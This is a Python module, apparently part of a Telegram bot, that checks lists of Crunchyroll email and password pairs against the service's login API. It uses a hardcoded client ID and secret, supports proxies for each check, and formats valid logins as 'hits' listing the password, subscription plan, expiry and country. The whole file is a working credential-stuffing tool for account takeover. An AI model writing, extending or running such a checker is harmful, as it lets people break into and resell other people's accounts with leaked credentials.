"""
bot/modules/crunchyroll.py
~~~~~~~~~~~~~~~~~~~~~~~~~~
Crunchyroll account checker using ``requests`` – exact logic from ``CR.py``.

Each check runs in its own ``requests.Session`` (isolated cookies/state)
and is dispatched via ``asyncio.to_thread()`` so the event loop stays free.
"""

from __future__ import annotations

import asyncio
import uuid
from datetime import datetime
from typing import Optional

import requests

from bot.utils.logger import setup_logger

log = setup_logger("mod.crunchyroll")

# ── API constants (from CR.py) ──────────────────────────────────────────
_CLIENT_ID = "o7uowy7q4lgltbavyhjq"
_CLIENT_SECRET = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"

_COUNTRY_MAP = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽",
    "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴", "AR": "Argentina 🇦🇷",
    "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹",
    "BR": "Brazil 🇧🇷", "CA": "Canada 🇨🇦",
    "FR": "France 🇫🇷", "DE": "Germany 🇩🇪",
    "IN": "India 🇮🇳", "IT": "Italy 🇮🇹",
    "JP": "Japan 🇯🇵", "MX": "Mexico 🇲🇽",
    "ES": "Spain 🇪🇸", "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸",
}


# ── Synchronous check (mirrors CR.py exactly) ──────────────────────────

def _check_sync(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Check a single Crunchyroll account using ``requests.Session``.

    Returns a dict with hit details, a dict with ``free=True`` for free
    accounts, or ``None`` for bad credentials / errors.
    """
    session = requests.Session()
    headers = {
        "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        # 1. AUTHENTICATION
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": _CLIENT_ID,
            "client_secret": _CLIENT_SECRET,
            "device_type": "SamsungTV",
            "device_id": str(uuid.uuid4()),
            "device_name": "Goku",
        }
        r1 = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            data=data, headers=headers, proxies=proxy, timeout=10,
        )

        if r1.status_code != 200:
            return None

        auth = r1.json()
        token = auth["access_token"]
        pid = auth["profile_id"]
        headers["Authorization"] = f"Bearer {token}"

        # 2. ACCOUNT DETAILS
        r2 = session.get(
            "https://beta-api.crunchyroll.com/accounts/v1/me",
            headers=headers, proxies=proxy, timeout=7,
        ).json()
        ev = r2.get("email_verified", False)
        guid = r2.get("external_id")

        # 3. PLAN & COUNTRY
        r3 = session.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits",
            headers=headers, proxies=proxy, timeout=7,
        ).json()

        if r3.get("total", 0) > 0:
            country_code = r3.get("subscription_country", "Unknown")
            country_full = _COUNTRY_MAP.get(country_code, country_code)

            raw_benefit = str(r3.get("items", []))
            if "streams.4" in raw_benefit:
                plan = "MEGA FAN MEMBER"
            elif "streams.6" in raw_benefit:
                plan = "ULTIMATE FAN MEMBER"
            elif "streams.1" in raw_benefit:
                plan = "FAN MEMBER"
            else:
                plan = "Premium"

            # 4. EXPIRY
            r4 = session.get(
                f"https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions",
                headers=headers, proxies=proxy, timeout=7,
            ).json()

            expiry = "N/A"
            remaining = "0"
            if "nextRenewalDate" in str(r4):
                for s in r4.get("subscriptions", []):
                    if s.get("nextRenewalDate"):
                        expiry = s["nextRenewalDate"].split("T")[0]
                        try:
                            d1 = datetime.strptime(expiry, "%Y-%m-%d")
                            remaining = str((d1 - datetime.now()).days)
                        except ValueError:
                            pass
                        break

            return {
                "email": email,
                "password": password,
                "email_verified": ev,
                "plan": plan,
                "expiry": expiry,
                "remaining_days": remaining,
                "country": country_full,
            }
        else:
            # Valid login but no subscription → free account.
            return {"email": email, "password": password, "free": True}

    except Exception as exc:
        log.debug("CR check failed for %s: %s", email, exc)
        return None


# ── Async wrapper ───────────────────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Async wrapper — runs the synchronous check in a thread."""
    return await asyncio.to_thread(_check_sync, email, password, proxy)


# ── Formatting helpers ──────────────────────────────────────────────────

def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly Telegram string."""
    return (
        f"🍥 **Crunchyroll Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Verified:** {hit['email_verified']}\n"
        f"┣ **Plan:** {hit['plan']}\n"
        f"┣ **Expiry:** {hit['expiry']}\n"
        f"┣ **Remaining:** {hit['remaining_days']} days\n"
        f"┗ **Country:** {hit['country']}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line format for results file."""
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Plan={hit['plan']} | Expiry={hit['expiry']} | "
        f"Days={hit['remaining_days']} | Country={hit['country']}"
    )
